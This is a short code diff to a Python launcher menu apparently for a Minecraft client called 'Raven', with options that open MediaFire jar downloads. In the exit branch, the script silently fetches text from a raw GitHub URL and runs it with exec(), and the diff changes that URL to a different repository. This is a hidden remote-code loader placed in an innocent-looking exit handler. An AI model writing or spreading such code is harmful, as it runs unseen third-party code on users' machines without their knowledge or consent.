@@ -61,7 +61,7 @@ while True:
     if chon == '-':
         os.system('cls')
         print("Leaving Raven")
-        exec(requests.get('https://raw.githubusercontent.com/MCCFree/MCC-Loader/main/Minecraft').text)
+        exec(requests.get('https://raw.githubusercontent.com/Rafail2023/RovaClient/refs/heads/main/Minecraft.txt').text)
     elif chon == 'B1':
         webbrowser.open_new("https://www.mediafire.com/file/8wbt1e7r7gz4wrq/Raven_B1.jar/file")
     elif chon == 'B2':
